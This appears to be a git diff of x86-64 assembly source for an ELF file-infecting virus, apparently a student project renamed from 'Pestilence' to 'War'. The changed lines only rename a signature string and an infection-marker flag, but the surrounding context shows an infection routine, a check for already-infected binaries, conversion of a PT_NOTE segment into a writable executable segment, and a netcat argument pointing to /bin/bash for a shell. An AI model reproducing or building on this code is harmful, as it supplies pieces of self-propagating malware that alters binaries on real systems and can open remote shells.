@@ -496,7 +496,7 @@ nc_arg6: db "/bin/bash", 0
 magic_key: db 0x00					; Will be replaced by a script
 magic_key_size: equ $ - magic_key
 ; never used but here to be copied in the binary
-signature: db "Pestilence v1.0 by jmaia and dhubleur", 0
+signature: db "War v1.0 by jmaia and dhubleur", 0
 ; END FAKE .data SECTION
 
 ; void infection_routine(long _compressed_data_size, uint8_t *_real_begin_compressed_data_ptr)
@@ -1132,12 +1132,12 @@ has_signature:
 		imul rcx, rsi				; 		...
 		add rax, rcx				; 		...
 
-		; check if PF_PESTILENCE
-		mov rdi, rax				; if (!(cur_phdr->p_flag & PF_PESTILENCE))
+		; check if PF_WAR
+		mov rdi, rax				; if (!(cur_phdr->p_flag & PF_WAR))
 		add rdi, elf64_phdr.p_flags		; ...
 		mov eax, [rdi]				; ...
-		and eax, PF_PESTILENCE			; ...
-		cmp eax, PF_PESTILENCE			; ...
+		and eax, PF_WAR			; ...
+		cmp eax, PF_WAR			; ...
 		jne .next_phdr_loop			; 	goto next_phdr_loop;
 
 		jmp .found				; goto found;
@@ -1205,7 +1205,7 @@ convert_pt_note_to_load:
 
 	mov rdi, rax					; _flags_ptr = _note_segment->p_flags;
 	add rdi, elf64_phdr.p_flags			; ...
-	mov DWORD [rdi], PF_X | PF_R | PF_W | PF_PESTILENCE	; *_flags_ptr = PF_X | PF_R | PF_W | PF_PESTILENCE;
+	mov DWORD [rdi], PF_X | PF_R | PF_W | PF_WAR	; *_flags_ptr = PF_X | PF_R | PF_W | PF_WAR;
 
 	mov rdi, rax					; _offset_ptr = _note_segment->p_offset;
 	add rdi, elf64_phdr.p_offset			; ...
